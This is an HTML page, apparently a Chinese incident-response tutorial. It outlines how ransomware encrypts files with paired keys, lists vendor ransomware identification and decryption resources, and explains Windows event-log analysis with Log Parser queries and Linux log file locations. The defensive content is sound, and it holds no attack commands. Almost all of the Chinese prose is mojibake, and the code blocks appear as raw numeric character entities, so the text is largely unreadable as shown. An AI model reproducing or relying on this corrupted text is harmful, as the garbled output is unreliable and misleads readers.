3ã€å°†ç”¨æˆ·ç”µè„‘ä¸Šçš„æ–‡ä»¶é€šè¿‡ å…¬é’¥Z åŠ å¯†<br>
4ã€å°†ç”¨æˆ·ç”µè„‘ä¸Šçš„ ç§é’¥Z é€šè¿‡ å…¬é’¥Q åŠ å¯†<br>
5ã€åˆ é™¤ç”¨æˆ·ç”µè„‘ä¸Šçš„ ç§é’¥Z ã€å…¬é’¥Qã€æ•°æ®<br>
</p>

<p>
<b>è§£å¯†è¿‡ç¨‹</b><br>
</p>

<p>
æ”¯ä»˜å®Œèµé‡‘ä¹‹åè·å¾— ç§é’¥Q ï¼Œé€šè¿‡ç”¨æˆ·çš„ åŠ å¯†ç§é’¥ è§£å‡º ç§é’¥Zï¼Œé€šè¿‡ ç§é’¥Z è§£å¯† ç”¨æˆ·æ•°æ®ã€‚<br>
</p>
</div>
</div>
<div id="outline-container-org3c51e72" class="outline-4">
<h4 id="org3c51e72">å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“</h4>
<div class="outline-text-4" id="text-org3c51e72">
<p>
åœ¨å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“è¾“å…¥ç—…æ¯’åã€å‹’ç´¢é‚®ç®±ã€è¢«åŠ å¯†åæ–‡ä»¶çš„åç¼€åï¼Œæˆ–ç›´æ¥ä¸Šä¼ è¢«åŠ å¯†æ–‡ä»¶ã€å‹’ç´¢æç¤ºä¿¡æ¯ï¼Œå³å¯å¿«é€ŸæŸ¥æ‰¾åˆ°ç—…æ¯’è¯¦æƒ…å’Œè§£å¯†å·¥å…·ã€‚<br>
</p>

<p>
ã€360ã€‘ å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“ï¼Œæ”¯æŒæ£€ç´¢è¶…è¿‡800ç§å¸¸è§å‹’ç´¢ç—…æ¯’<br>
å®˜ç½‘ï¼š<a href="http://lesuobingdu.360.cn">http://lesuobingdu.360.cn</a><br>
ã€è…¾è®¯ã€‘ å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“ï¼Œæ”¯æŒæ£€ç´¢è¶…è¿‡ 1000+ ç§å¸¸è§å‹’ç´¢ç—…æ¯’<br>
å®˜ç½‘ï¼š<a href="https://guanjia.qq.com/pr/ls">https://guanjia.qq.com/pr/ls</a><br>
ã€å¯æ˜ã€‘VenusEyeå‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“ï¼Œè¶…300ç§å‹’ç´¢ç—…æ¯’å®¶æ—<br>
å®˜ç½‘ï¼š<a href="https://lesuo.venuseye.com.cn">https://lesuo.venuseye.com.cn</a><br>
ã€å¥‡å®‰ä¿¡ã€‘å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“<br>
å®˜ç½‘ï¼š<a href="https://lesuobingdu.qianxin.com">https://lesuobingdu.qianxin.com</a><br>
ã€æ·±ä¿¡æœã€‘å‹’ç´¢ç—…æ¯’æœç´¢å¼•æ“<br>
å®˜ç½‘ï¼š<a href="https://edr.sangfor.com.cn/#/information/ransom_search">https://edr.sangfor.com.cn/#/information/ransom_search</a><br>
</p>
</div>
</div>
<div id="outline-container-orgfbd0e32" class="outline-4">
<h4 id="orgfbd0e32">å‹’ç´¢è½¯ä»¶è§£å¯†å·¥å…·é›†</h4>
<div class="outline-text-4" id="text-orgfbd0e32">
<p>
å¾ˆå¤šå®‰å…¨å…¬å¸éƒ½æä¾›äº†å…è´¹çš„å‹’ç´¢ç—…æ¯’è§£å¯†å·¥å…·ä¸‹è½½ï¼Œæ”¶é›†å’Œæ•´ç†ç›¸å…³ä¸‹è½½åœ°å€ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬äº†è§£å’Œè·å–æœ€æ–°çš„å‹’ç´¢ç—…æ¯’è§£å¯†å·¥å…·ã€‚<br>
</p>

<p>
ã€è…¾è®¯å“ˆå‹ƒã€‘å‹’ç´¢è½¯ä»¶ä¸“æ€å·¥å…·<br>
å®˜ç½‘ï¼š<a href="https://habo.qq.com/tool">https://habo.qq.com/tool</a><br>
ã€é‡‘å±±æ¯’éœ¸ã€‘å‹’ç´¢ç—…æ¯’å…ç–«å·¥å…·<br>
å®˜ç½‘ï¼š<a href="http://www.duba.net/dbt/wannacry.html">http://www.duba.net/dbt/wannacry.html</a><br>
ã€ç«ç»’ã€‘å®‰å…¨å·¥å…·ä¸‹è½½<br>
å®˜ç½‘ï¼š<a href="http://bbs.huorong.cn/forum-55-1.html">http://bbs.huorong.cn/forum-55-1.html</a><br>
ã€ç‘æ˜Ÿã€‘è§£å¯†å·¥å…·ä¸‹è½½<br>
å®˜ç½‘ï¼š<a href="http://it.rising.com.cn/fanglesuo/index.html">http://it.rising.com.cn/fanglesuo/index.html</a><br>
ã€nomoreransomã€‘å‹’ç´¢è½¯ä»¶è§£å¯†å·¥å…·é›†<br>
å®˜ç½‘ï¼š<a href="https://www.nomoreransom.org/zh/index.html">https://www.nomoreransom.org/zh/index.html</a><br>
ã€MalwareHunterTeamã€‘å‹’ç´¢è½¯ä»¶è§£å¯†å·¥å…·é›†<br>
å®˜ç½‘ï¼š<a href="https://id-ransomware.malwarehunterteam.com">https://id-ransomware.malwarehunterteam.com</a><br>
ã€å¡å·´æ–¯åŸºã€‘å…è´¹å‹’ç´¢è§£å¯†å™¨<br>
å®˜ç½‘ï¼š<a href="https://noransom.kaspersky.com">https://noransom.kaspersky.com</a><br>
ã€Avastã€‘å…è´¹å‹’ç´¢è½¯ä»¶è§£å¯†å·¥å…·<br>
å®˜ç½‘ï¼š<a href="https://www.avast.com/zh-cn/ransomware-decryption-tools">https://www.avast.com/zh-cn/ransomware-decryption-tools</a><br>
ã€Emsisoftã€‘å…è´¹å‹’ç´¢è½¯ä»¶è§£å¯†å·¥å…·<br>
å®˜ç½‘ï¼š<a href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">https://www.emsisoft.com/ransomware-decryption-tools/free-download</a><br>
ã€GitHub é¡¹ç›®ã€‘å‹’ç´¢ç—…æ¯’è§£å¯†å·¥å…·æ”¶é›†æ±‡æ€»<br>
å®˜ç½‘ï¼š<a href="https://github.com/jiansiting/Decryption-Tools">https://github.com/jiansiting/Decryption-Tools</a><br>
</p>

<p>
é’ˆå¯¹å‹’ç´¢ç—…æ¯’æœ€å¥½çš„é˜²å¾¡æ–¹æ³•å°±æ˜¯å¤‡ä»½ã€‚<br>
</p>
</div>
</div>
</div>
</section>
<section id="outline-container-orgb1988fc" class="outline-2">
<h2 id="orgb1988fc">æ—¥å¿—åˆ†æ</h2>
<div class="outline-text-2" id="text-orgb1988fc">
<p>
ä¸»è¦å†…å®¹ï¼š<br>
</p>
<ul class="org-ul">
<li>Windows æ—¥å¿—åˆ†æ<br></li>
<li>Linux æ—¥å¿—åˆ†æ<br></li>
<li>web æ—¥å¿—åˆ†æ<br></li>
<li>MySQL æ—¥å¿—åˆ†æ<br></li>
</ul>
</div>
<div id="outline-container-org216e8eb" class="outline-3">
<h3 id="org216e8eb">Windowsæ—¥å¿—åˆ†æ</h3>
<div class="outline-text-3" id="text-org216e8eb">
<p>
<b>ä½¿ç”¨ç¯å¢ƒï¼šWindows Server 2008 R2</b><br>
</p>
</div>
<div id="outline-container-org34a1560" class="outline-4">
<h4 id="org34a1560">Windowsäº‹ä»¶æ—¥å¿—ç®€ä»‹</h4>
<div class="outline-text-4" id="text-org34a1560">
<p>
Windowsç³»ç»Ÿæ—¥å¿—æ˜¯è®°å½•ç³»ç»Ÿä¸­ç¡¬ä»¶ã€è½¯ä»¶å’Œç³»ç»Ÿé—®é¢˜çš„ä¿¡æ¯ï¼ŒåŒæ—¶è¿˜å¯ä»¥ç›‘è§†ç³»ç»Ÿä¸­å‘ç”Ÿçš„äº‹ä»¶ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡å®ƒæ¥æ£€æŸ¥é”™è¯¯å‘ç”Ÿçš„åŸå› ï¼Œæˆ–è€…å¯»æ‰¾å—åˆ°æ”»å‡»æ—¶æ”»å‡»è€…ç•™ä¸‹çš„ç—•è¿¹ã€‚<br>
</p>

<p>
Windowsä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç±»æ—¥å¿—è®°å½•ç³»ç»Ÿäº‹ä»¶ï¼šåº”ç”¨ç¨‹åºæ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—å’Œå®‰å…¨æ—¥å¿—ã€‚<br>
</p>

<p>
å¼€å§‹èœå•&#x2013;&gt;ç®¡ç†å·¥å…·&#x2013;&gt;äº‹ä»¶æŸ¥çœ‹å™¨<br>
</p>

<p>
<b>ç³»ç»Ÿæ—¥å¿—</b><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#35760;&#24405;&#25805;&#20316;&#31995;&#32479;&#32452;&#20214;&#20135;&#29983;&#30340;&#20107;&#20214;&#65292;&#20027;&#35201;&#21253;&#25324;&#39537;&#21160;&#31243;&#24207;&#12289;&#31995;&#32479;&#32452;&#20214;&#21644;&#24212;&#29992;&#36719;&#20214;&#30340;&#23849;&#28291;&#20197;&#21450;&#25968;&#25454;&#20002;&#22833;&#38169;&#35823;&#31561;&#12290;&#31995;&#32479;&#26085; &#24535;&#20013;&#35760;&#24405;&#30340;&#26102;&#38388;&#31867;&#22411;&#30001;Windows&#25805;&#20316;&#31995;&#32479;&#39044;&#20808;&#23450;&#20041;&#12290;
&#40664;&#35748;&#20301;&#32622;&#65306; %SystemRoot%\System32\Winevt\Logs\System.evtx
</pre>
</div>

<p>
<b>åº”ç”¨ç¨‹åºæ—¥å¿—</b><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#21253;&#21547;&#30001;&#24212;&#29992;&#31243;&#24207;&#25110;&#31995;&#32479;&#31243;&#24207;&#35760;&#24405;&#30340;&#20107;&#20214;&#65292;&#20027;&#35201;&#35760;&#24405;&#31243;&#24207;&#36816;&#34892;&#26041;&#38754;&#30340;&#20107;&#20214;&#65292;&#20363;&#22914;&#25968;&#25454;&#24211;&#31243;&#24207;&#21487;&#20197;&#22312;&#24212;&#29992;&#31243;&#24207;&#26085;&#24535; &#20013;&#35760;&#24405;&#25991;&#20214;&#38169;&#35823;&#65292;&#31243;&#24207;&#24320;&#21457;&#20154;&#21592;&#21487;&#20197;&#33258;&#34892;&#20915;&#23450;&#30417;&#35270;&#21738;&#20123;&#20107;&#20214;&#12290;&#22914;&#26524;&#26576;&#20010;&#24212;&#29992;&#31243;&#24207;&#20986;&#29616;&#23849;&#28291;&#24773;&#20917;&#65292;&#37027;&#20040;&#25105;&#20204;&#21487;&#20197; &#20174;&#31243;&#24207;&#20107;&#20214;&#26085;&#24535;&#20013;&#25214;&#21040;&#30456;&#24212;&#30340;&#35760;&#24405;&#12290;

&#40664;&#35748;&#20301;&#32622;&#65306;%SystemRoot%\System32\Winevt\Logs\Application.evtx
</pre>
</div>

<p>
<b>å®‰å…¨æ—¥å¿—</b><br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#35760;&#24405;&#31995;&#32479;&#30340;&#23433;&#20840;&#23457;&#35745;&#20107;&#20214;&#65292;&#21253;&#21547;&#21508;&#31181;&#31867;&#22411;&#30340;&#30331;&#24405;&#26085;&#24535;&#12289;&#23545;&#35937;&#35775;&#38382;&#26085;&#24535;&#12289;&#36827;&#31243;&#36861;&#36394;&#26085;&#24535;&#12289;&#29305;&#26435;&#20351;&#29992;&#12289;&#36134;&#21495;&#31649;&#29702;&#12289; &#31574;&#30053;&#21464;&#26356;&#12289;&#31995;&#32479;&#20107;&#20214;&#12290;&#23433;&#20840;&#26085;&#24535;&#20063;&#26159;&#35843;&#26597;&#21462;&#35777;&#20013;&#26368;&#24120;&#29992;&#21040;&#30340;&#26085;&#24535;&#12290;&#40664;&#35748;&#35774;&#32622;&#19979;&#65292;&#23433;&#20840;&#26085;&#24535;&#26159;&#20851;&#38381;&#30340;&#65292;&#21487;&#20197;&#20351;&#29992; &#32452;&#31574;&#30053;&#26469;&#21551;&#21160;&#23433;&#20840;&#26085;&#24535;&#65292;&#25110;&#32773;&#22312;&#27880;&#20876;&#34920;&#20013;&#35774;&#32622;&#23457;&#26680;&#31574;&#30053;&#65292;&#20197;&#20415;&#24403;&#23433;&#20840;&#26085;&#24535;&#28385;&#21518;&#20351;&#31995;&#32479;&#20572;&#27490;&#21709;&#24212;&#12290;

&#40664;&#35748;&#20301;&#32622;&#65306;%SystemRoot%\System32\Winevt\Logs\Security.evtx
</pre>
</div>

<p>
ç³»ç»Ÿæ—¥å¿—å’Œåº”ç”¨ç¨‹åºæ—¥å¿—å­˜å‚¨ç€æ•…éšœæ’é™¤ä¿¡æ¯ï¼Œå¯¹äºç³»ç»Ÿç®¡ç†å‘˜æ›´ä¸ºæœ‰ç”¨ã€‚å®‰å…¨æ—¥å¿—è®°å½•ç€äº‹ä»¶å®¡è®¡ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·éªŒè¯ï¼ˆç™»å½•ã€è¿œç¨‹è®¿é—®ç­‰ï¼‰å’Œç‰¹å®šç”¨æˆ·åœ¨è®¤è¯åå¯¹ç³»ç»Ÿåšäº†ä»€ä¹ˆï¼Œå¯¹äºåº”æ€¥äººå‘˜è€Œè¨€ï¼Œæ›´æœ‰å¸®åŠ©ã€‚<br>
</p>
</div>
</div>
<div id="outline-container-org34f58c4" class="outline-4">
<h4 id="org34f58c4">å®¡æ ¸ç­–ç•¥ä¸äº‹ä»¶æŸ¥çœ‹å™¨</h4>
<div class="outline-text-4" id="text-org34f58c4">
<p>
Windows Server 2008 R2 ç³»ç»Ÿçš„å®¡æ ¸åŠŸèƒ½åœ¨é»˜è®¤çŠ¶æ€ä¸‹å¹¶æ²¡æœ‰å¯ç”¨ï¼Œå»ºè®®å¼€å¯å®¡æ ¸ç­–ç•¥ï¼Œè‹¥æ—¥åç³»ç»Ÿå‡ºç°æ•…éšœã€å®‰å…¨äº‹æ•…åˆ™å¯ä»¥æŸ¥çœ‹ç³»ç»Ÿçš„æ—¥å¿—æ–‡ä»¶ï¼Œæ’é™¤æ•…éšœï¼Œè¿½æŸ¥å…¥ä¾µè€…çš„ä¿¡æ¯ç­‰ã€‚<br>
PSï¼šé»˜è®¤çŠ¶æ€ä¸‹ï¼Œä¹Ÿä¼šè®°å½•ä¸€äº›ç®€å•çš„æ—¥å¿—ï¼Œæ—¥å¿—é»˜è®¤å¤§å°20M<br>
</p>

<p>
è®¾ç½®ï¼šå¼€å§‹ â†’ ç®¡ç†å·¥å…· â†’ æœ¬åœ°å®‰å…¨ç­–ç•¥ â†’ æœ¬åœ°ç­–ç•¥ â†’ å®¡æ ¸ç­–ç•¥ï¼Œæœ¬åœ°å®‰å…¨è®¾ç½®ã€‚<br>
</p>

<p>
é»˜è®¤éƒ½æœªå®¡æ ¸ï¼ŒåŒå‡»å¯ä»¥é’ˆå¯¹ä¸åŒäº‹ä»¶åšæˆåŠŸå’Œå¤±è´¥å®¡æ ¸ã€‚<br>
</p>


<figure id="orgef9e9bd">
<img src="./images/img_20230814_163557.png" alt="img_20230814_163557.png" width="60%"><br>

</figure>


<p>
<b>æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—æ–¹æ³•ï¼š</b><br>
1ã€åœ¨â€œå¼€å§‹â€èœå•ä¸Šï¼Œä¾æ¬¡æŒ‡å‘â€œæ‰€æœ‰ç¨‹åºâ€ã€â€œç®¡ç†å·¥å…·â€ï¼Œç„¶åå•å‡»â€œäº‹ä»¶æŸ¥çœ‹å™¨â€<br>
2ã€æŒ‰ "Window+R"ï¼Œè¾“å…¥ â€eventvwr.mscâ€œ ä¹Ÿå¯ä»¥ç›´æ¥è¿›å…¥â€œäº‹ä»¶æŸ¥çœ‹å™¨â€<br>
</p>
</div>
</div>
<div id="outline-container-orgdd547b9" class="outline-4">
<h4 id="orgdd547b9">äº‹ä»¶æ—¥å¿—åˆ†æ</h4>
<div class="outline-text-4" id="text-orgdd547b9">
<p>
å¯¹äºWindowsäº‹ä»¶æ—¥å¿—åˆ†æï¼Œä¸åŒçš„EVENT IDä»£è¡¨äº†ä¸åŒçš„æ„ä¹‰ï¼Œæ‘˜å½•ä¸€äº›å¸¸è§çš„å®‰å…¨äº‹ä»¶çš„è¯´æ˜ï¼š<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#20107;&#20214;ID &#35828;&#26126;
4624 &#30331;&#24405;&#25104;&#21151;
4625 &#30331;&#24405;&#22833;&#36133;
4634 &#27880;&#38144;&#25104;&#21151;
4647 &#29992;&#25143;&#21551;&#21160;&#30340;&#27880;&#38144;
4672 &#20351;&#29992;&#36229;&#32423;&#29992;&#25143;&#65288;&#22914;&#31649;&#29702;&#21592;&#65289;&#36827;&#34892;&#30331;&#24405;
4720 &#21019;&#24314;&#29992;&#25143;
</pre>
</div>

<p>
æ¡ˆä¾‹ï¼šæš´åŠ›ç ´è§£æ’æŸ¥<br>
windows 2008 å¼€å§‹èœå•&#x2013;&gt;è®¡ç®—æœºå³é”®å±æ€§&#x2013;&gt;è¿œç¨‹è®¾ç½®&#x2013;&gt;é€‰æ‹©"å…è®¸è¿è¡Œä»»æ„ç‰ˆæœ¬è¿œç¨‹æ¡Œé¢çš„è®¡ç®—æœºè¿æ¥"ï¼Œç„¶åä½¿ç”¨çˆ†ç ´å·¥å…·çˆ†ç ´ï¼Œå¦‚è¶…çº§å¼±å£ä»¤å·¥å…·ã€‚<br>
</p>

<ol class="org-ol">
<li>åœ¨â€œå¼€å§‹â€èœå•ä¸Šï¼Œä¾æ¬¡æŒ‡å‘â€œæ‰€æœ‰ç¨‹åºâ€ã€â€œç®¡ç†å·¥å…·â€ï¼Œç„¶åå•å‡»â€œäº‹ä»¶æŸ¥çœ‹å™¨â€ï¼›<br></li>
<li>åœ¨äº‹ä»¶æŸ¥çœ‹å™¨ä¸­ï¼Œå•å‡»â€œå®‰å…¨â€ï¼ŒæŸ¥çœ‹å®‰å…¨æ—¥å¿—ï¼›<br></li>
<li>åœ¨å®‰å…¨æ—¥å¿—å³ä¾§æ“ä½œä¸­ï¼Œç‚¹å‡»â€œç­›é€‰å½“å‰æ—¥å¿—â€ï¼Œè¾“å…¥äº‹ä»¶IDè¿›è¡Œç­›é€‰ã€‚<br></li>
</ol>
<p>
4624 &#x2013; ç™»å½•æˆåŠŸ<br>
4625 &#x2013; ç™»å½•å¤±è´¥<br>
4634 &#x2013; æ³¨é”€æˆåŠŸ<br>
4647 &#x2013; ç”¨æˆ·å¯åŠ¨çš„æ³¨é”€<br>
4672 &#x2013; ä½¿ç”¨è¶…çº§ç”¨æˆ·ï¼ˆå¦‚ç®¡ç†å‘˜ï¼‰è¿›è¡Œç™»å½•<br>
</p>

<p>
è¾“å…¥äº‹ä»¶IDï¼š4625è¿›è¡Œæ—¥å¿—ç­›é€‰ï¼Œå‘ç°äº‹ä»¶IDï¼š4625ï¼Œå‡å¦‚äº‹ä»¶æ•°æ˜¯175904ï¼Œå³ä»£è¡¨ç”¨æˆ·ç™»å½•å¤±è´¥äº†175904æ¬¡ï¼Œé‚£ä¹ˆè¿™å°æœåŠ¡å™¨ç®¡ç†å‘˜è´¦å·å¯èƒ½é­é‡äº†æš´åŠ›ç ´è§£ã€‚<br>
</p>
</div>
</div>
<div id="outline-container-orgfc1f9ed" class="outline-4">
<h4 id="orgfc1f9ed">æ—¥å¿—åˆ†æå·¥å…·</h4>
<div class="outline-text-4" id="text-orgfc1f9ed">
</div>
<div id="outline-container-orgdc6e219" class="outline-5">
<h5 id="orgdc6e219">Log Parser</h5>
<div class="outline-text-5" id="text-orgdc6e219">
<p>
Log Parserï¼ˆæ˜¯å¾®è½¯å…¬å¸å‡ºå“çš„æ—¥å¿—åˆ†æå·¥å…·ï¼Œå®ƒåŠŸèƒ½å¼ºå¤§ï¼Œä½¿ç”¨ç®€å•ï¼Œå¯ä»¥åˆ†æåŸºäºæ–‡æœ¬çš„æ—¥å¿—æ–‡ä»¶ã€XML æ–‡ä»¶ã€CSVï¼ˆé€—å·åˆ†éš”ç¬¦ï¼‰æ–‡ä»¶ï¼Œä»¥åŠæ“ä½œç³»ç»Ÿçš„äº‹ä»¶æ—¥å¿—ã€æ³¨å†Œè¡¨ã€æ–‡ä»¶ç³»ç»Ÿã€Active Directoryã€‚å®ƒå¯ä»¥åƒä½¿ç”¨ SQL è¯­å¥ä¸€æ ·æŸ¥è¯¢åˆ†æè¿™äº›æ•°æ®ï¼Œç”šè‡³å¯ä»¥æŠŠåˆ†æç»“æœä»¥å„ç§å›¾è¡¨çš„å½¢å¼å±•ç°å‡ºæ¥ã€‚<br>
</p>

<p>
Log Parser 2.2ä¸‹è½½åœ°å€ï¼š<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a><br>
Log Parser ä½¿ç”¨ç¤ºä¾‹ï¼š<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a><br>
</p>

<p>
<b>åŸºæœ¬æŸ¥è¯¢ç»“æ„</b><br>
</p>
<div class="org-src-container">
<pre class="src src-sh">Logparser.exe &#8211;i:EVT &#8211;o:DATAGRID <span style="color: #8b2252;">"SELECT * FROM c:\xx.evtx"</span>
</pre>
</div>

<p>
<b>ä½¿ç”¨Log Parseråˆ†ææ—¥å¿—</b><br>
1ã€æŸ¥è¯¢ç™»å½•æˆåŠŸçš„äº‹ä»¶<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#30331;&#24405;&#25104;&#21151;&#30340;&#25152;&#26377;&#20107;&#20214;
LogParser.exe -i:EVT &#8211;o:DATAGRID <span style="color: #8b2252;">"SELECT * FROM c:\security.evtx where EventID=4624"</span>

&#25351;&#23450;&#30331;&#24405;&#26102;&#38388;&#33539;&#22260;&#30340;&#20107;&#20214;&#65306;
LogParser.exe -i:EVT &#8211;o:DATAGRID <span style="color: #8b2252;">"SELECT * FROM c:\Security.evtx where TimeGenerated&gt;'2022-11-05 00:00:00' and TimeGenerated&lt;'2022-11-06 00:00:00' and EventID=4624"</span>

&#25552;&#21462;&#30331;&#24405;&#25104;&#21151;&#30340;&#29992;&#25143;&#21517;&#21644;IP&#65306;
LogParser.exe -i:EVT &#8211;o:DATAGRID <span style="color: #8b2252;">"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\security.evtx where EventID=4624"</span>
</pre>
</div>

<p>
2ã€æŸ¥è¯¢ç™»å½•å¤±è´¥çš„äº‹ä»¶<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#30331;&#24405;&#22833;&#36133;&#30340;&#25152;&#26377;&#20107;&#20214;&#65306;
LogParser.exe -i:EVT &#8211;o:DATAGRID <span style="color: #8b2252;">"SELECT * FROM c:\security.evtx where EventID=4625"</span>

&#25552;&#21462;&#30331;&#24405;&#22833;&#36133;&#29992;&#25143;&#21517;&#36827;&#34892;&#32858;&#21512;&#32479;&#35745;&#65306; LogParser.exe -i:EVT <span style="color: #8b2252;">"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\security.evtx where EventID=4625 GROUP BY Message"</span>
</pre>
</div>

<p>
3ã€ç³»ç»Ÿå†å²å¼€å…³æœºè®°å½•<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">LogParser.exe -i:EVT &#8211;o:DATAGRID <span style="color: #8b2252;">"SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006"</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-orgd108e99" class="outline-5">
<h5 id="orgd108e99">LogParser Lizard</h5>
<div class="outline-text-5" id="text-orgd108e99">
<p>
å¯¹äºGUIç¯å¢ƒçš„Log Parser Lizardï¼Œå…¶ç‰¹ç‚¹æ˜¯æ¯”è¾ƒæ˜“äºä½¿ç”¨ï¼Œç”šè‡³ä¸éœ€è¦è®°å¿†ç¹ççš„å‘½ä»¤ï¼Œåªéœ€è¦åšå¥½è®¾ç½®ï¼Œå†™å¥½åŸºæœ¬çš„SQLè¯­å¥ï¼Œå°±å¯ä»¥ç›´è§‚çš„å¾—åˆ°ç»“æœã€‚<br>
</p>

<p>
ä¸‹è½½åœ°å€ï¼š<a href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a><br>
</p>

<p>
ä¾èµ–åŒ…ï¼šMicrosoft .NET Framework 4.5ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a><br>
</p>
</div>
</div>
</div>
<div id="outline-container-orgf48e25c" class="outline-4">
<h4 id="orgf48e25c">å……å†…å®¹</h4>
<div class="outline-text-4" id="text-orgf48e25c">
<p>
Windowsæ—¥å¿—åˆ†æå‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a><br>
</p>
</div>
</div>
</div>
<div id="outline-container-org9ef8b7a" class="outline-3">
<h3 id="org9ef8b7a">Linuxæ—¥å¿—åˆ†æ</h3>
<div class="outline-text-3" id="text-org9ef8b7a">
<p>
<b>ä½¿ç”¨ç¯å¢ƒï¼šCentOS</b><br>
</p>
</div>
<div id="outline-container-orga36ac1b" class="outline-4">
<h4 id="orga36ac1b">æ—¥å¿—ç®€ä»‹</h4>
<div class="outline-text-4" id="text-orga36ac1b">
<p>
æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/<br>
æŸ¥çœ‹æ—¥å¿—é…ç½®æƒ…å†µï¼šmore /etc/rsyslog.conf<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#26085;&#24535;&#25991;&#20214; &#35828;&#26126;
/var/log/cron &#35760;&#24405;&#20102;&#31995;&#32479;&#23450;&#26102;&#20219;&#21153;&#30456;&#20851;&#30340;&#26085;&#24535;

/var/log/cups &#35760;&#24405;&#25171;&#21360;&#20449;&#24687;&#30340;&#26085;&#24535;

/var/log/dmesg &#35760;&#24405;&#20102;&#31995;&#32479;&#22312;&#24320;&#26426;&#26102;&#20869;&#26680;&#33258;&#26816;&#30340;&#20449;&#24687;&#65292;&#20063;&#21487;&#20197;&#20351;&#29992;dmesg&#21629;&#20196;&#30452;&#25509;&#26597;&#30475;&#20869;&#26680;&#33258;&#26816;&#20449;&#24687;

/var/log/mailog &#35760;&#24405;&#37038;&#20214;&#20449;&#24687;

/var/log/message &#35760;&#24405;&#31995;&#32479;&#37325;&#35201;&#20449;&#24687;&#30340;&#26085;&#24535;&#12290;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;&#20013;&#20250;&#35760;&#24405;Linux&#31995;&#32479;&#30340;&#32477;&#22823;&#22810;&#25968;&#37325;&#35201;&#20449;&#24687;&#65292;&#22914;&#26524;&#31995;&#32479;&#20986;&#29616;&#38382;&#39064;&#26102;&#65292;&#39318;&#20808;&#35201;&#26816;&#26597;&#30340;&#23601;&#24212;&#35813;&#26159;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;

/var/log/btmp &#35760;&#24405;&#38169;&#35823;&#30331;&#24405;&#26085;&#24535;&#65292;&#36825;&#20010;&#25991;&#20214;&#26159;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#26597;&#30475;&#65292;&#32780;&#35201;&#20351;&#29992;lastb&#21629;&#20196;&#26597;&#30475;

/var/log/lastlog &#35760;&#24405;&#31995;&#32479;&#20013;&#25152;&#26377;&#29992;&#25143;&#26368;&#21518;&#19968;&#27425;&#30331;&#24405;&#26102;&#38388;&#30340;&#26085;&#24535;&#65292;&#36825;&#20010;&#25991;&#20214;&#26159;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#35201;&#20351;&#29992;lastlog&#21629;&#20196;&#26597;&#30475;

/var/log/wtmp &#27704;&#20037;&#35760;&#24405;&#25152;&#26377;&#29992;&#25143;&#30340;&#30331;&#24405;&#12289;&#27880;&#38144;&#20449;&#24687;&#65292;&#21516;&#26102;&#35760;&#24405;&#31995;&#32479;&#30340;&#21551;&#21160;&#12289;&#37325;&#21551;&#12289;&#20851;&#26426;&#20107;&#20214;&#12290;&#21516;&#26679;&#36825;&#20010;&#25991;&#20214;&#20063;&#26159;&#19968;&#20010;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#38656;&#35201;&#20351;&#29992;last&#21629;&#20196;&#26469;&#26597;&#30475;

/var/log/utmp &#35760;&#24405;&#24403;&#21069;&#24050;&#32463;&#30331;&#24405;&#30340;&#29992;&#25143;&#20449;&#24687;&#65292;&#36825;&#20010;&#25991;&#20214;&#20250;&#38543;&#30528;&#29992;&#25143;&#30340;&#30331;&#24405;&#21644;&#27880;&#38144;&#19981;&#26029;&#21464;&#21270;&#65292;&#21482;&#35760;&#24405;&#24403;&#21069;&#30331;&#24405;&#29992;&#25143;&#30340;&#20449;&#24687;&#12290;&#21516;&#26679;&#36825;&#20010;&#25991;&#20214;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#35201;&#20351;&#29992;w&#65292;who&#65292;users&#31561;&#21629;&#20196;&#26469;&#26597;&#35810;

